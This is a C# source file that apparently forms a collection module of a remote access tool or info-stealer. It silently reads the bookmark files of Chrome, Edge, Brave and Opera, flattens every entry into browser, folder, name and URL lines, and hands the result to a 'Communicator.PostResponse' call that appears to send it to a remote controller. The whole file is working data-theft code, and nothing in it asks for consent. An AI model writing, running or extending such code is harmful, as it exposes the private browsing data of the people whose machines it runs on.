using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Newtonsoft.Json.Linq;
using True.Core;

public class BrowserBookmarksExtractor
{
    private static readonly string LocalAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
    private static readonly (string path, string browser)[] Targets =
    {
        (@"Google\Chrome\User Data\Default\Bookmarks", "Chrome"),
        (@"Microsoft\Edge\User Data\Default\Bookmarks", "Edge"),
        (@"BraveSoftware\Brave-Browser\User Data\Default\Bookmarks", "Brave"),
        (@"Opera Software\Opera Stable\Bookmarks", "Opera")
    };

    public static void Extract()
    {
        var sb = new StringBuilder();

        foreach (var (relativePath, browser) in Targets)
        {
            string fullPath = Path.Combine(LocalAppData, relativePath);
            if (!File.Exists(fullPath))
            {
                Logger.Warn($"[BookmarksExtractor] {browser} Bookmarks file not found.");
                continue;
            }

            try
            {
                string json = File.ReadAllText(fullPath);
                JObject root = JObject.Parse(json);

                var bookmarks = new List<(string name, string url, string folder)>();
                ExtractBookmarks(root["roots"]?["bookmark_bar"], "Bookmarks Bar", bookmarks);
                ExtractBookmarks(root["roots"]?["other"], "Other Bookmarks", bookmarks);
                ExtractBookmarks(root["roots"]?["synced"], "Synced", bookmarks);

                foreach (var (name, url, folder) in bookmarks)
                {
                    sb.AppendLine($"{browser}|{folder}|{name}|{url}");
                }
            }
            catch (Exception ex)
            {
                Logger.Error($"[BookmarksExtractor] {browser} failed: {ex.Message}");
            }
        }

        if (sb.Length == 0)
            sb.Append("(no bookmarks)");

        Communicator.PostResponse("browser_bookmarks", sb.ToString().Trim());
    }

    private static void ExtractBookmarks(JToken token, string folder, List<(string, string, string)> list)
    {
        if (token == null) return;

        var children = token["children"];
        if (children == null) return;

        foreach (var child in children)
        {
            string type = child["type"]?.ToString();
            if (type == "url")
            {
                string name = child["name"]?.ToString();
                string url = child["url"]?.ToString();
                list.Add((name, url, folder));
            }
            else if (type == "folder")
            {
                string folderName = child["name"]?.ToString();
                ExtractBookmarks(child, $"{folder}/{folderName}", list);
            }
        }
    }
}
